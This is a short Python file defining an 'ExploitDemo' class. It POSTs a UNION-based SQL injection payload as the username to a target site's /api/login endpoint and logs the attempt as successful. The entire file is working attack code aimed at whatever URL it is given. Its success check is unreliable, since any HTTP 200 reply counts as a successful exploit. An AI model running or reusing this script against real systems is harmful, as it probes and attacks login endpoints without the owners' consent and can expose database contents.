import logging
import requests

logger = logging.getLogger(__name__)

class ExploitDemo:
    def __init__(self, target_url):
        self.target_url = target_url

    def demo_sql_injection(self):
        """Demonstrate SQL Injection exploit for SQLite3"""
        logger.debug("Running SQL Injection exploit demo")
        test_url = f"{self.target_url}/api/login"
        payload = "' UNION SELECT sqlite_version(), NULL --"
        try:
            response = requests.post(test_url, data={"username": payload, "password": "test"}, timeout=5)
            if "sqlite" in response.text.lower() or response.status_code == 200:
                logger.info("SQL Injection exploit demo successful")
                print("[DEMO] SQL Injection exploit successful")
            else:
                logger.warning("SQL Injection exploit demo failed")
        except Exception as e:
            logger.error(f"SQL Injection exploit demo failed: {str(e)}")
            raise